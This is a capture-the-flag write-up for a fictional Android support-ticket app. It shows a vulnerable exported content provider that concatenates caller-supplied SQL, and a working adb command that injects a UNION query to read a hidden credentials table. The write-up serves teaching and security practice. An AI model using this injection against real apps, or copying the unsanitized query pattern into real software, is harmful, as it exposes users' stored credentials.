# Deskline - writeup

Deskline is the Android app support agents use to work their ticket queue (v1.6.0) plus a
per-team sync backend. Install it, point the Server field at your instance, and tap "Sync
my queue". The app authenticates the device, pulls the queue into a local SQLite database,
and files an agent-only credential note into a separate `credentials` table the UI never
renders. That note is the flag, minted per team by the backend.

## The bug - exported content provider with SQL injection

`AndroidManifest.xml` exports `TicketProvider` (`android:exported="true"`, authority
`com.deskline.tickets`) so companion apps can read the agent's tickets. Decompile the APK
(`jadx deskline-1.6.0.apk`) and read `com/deskline/TicketProvider.query()`:

```java
String sql = "SELECT id, subject, body FROM tickets";
if (selection != null && selection.trim().length() > 0)
    sql += " WHERE " + selection;          // caller-controlled, unsanitized
return db.rawQuery(sql, null);
```

The caller-supplied `selection` is concatenated straight into the query. Any app on the
device (or adb) can inject SQL. UNION-select the hidden `credentials` table, lining the
columns up with the three the provider returns:

```
adb shell 'content query --uri content://com.deskline.tickets/tickets \
  --where "1=1 UNION SELECT id,label,value FROM credentials"'
```

(Quote the whole device command so the `content` tool receives the selection as a single
argument.) The `vault-unseal-code` row's `body` column is the flag.

## Notes

- The flag is minted per team by the backend and only lands in the team's own device DB
  after a sync. The APK contains the injectable component and the table names, never a flag.
- The provider needs no permission and the app need not be running or in the foreground -
  a malicious app with zero permissions, or adb, can read the queue and inject. That is the
  point of the finding: an exported provider that trusts its caller's SQL.
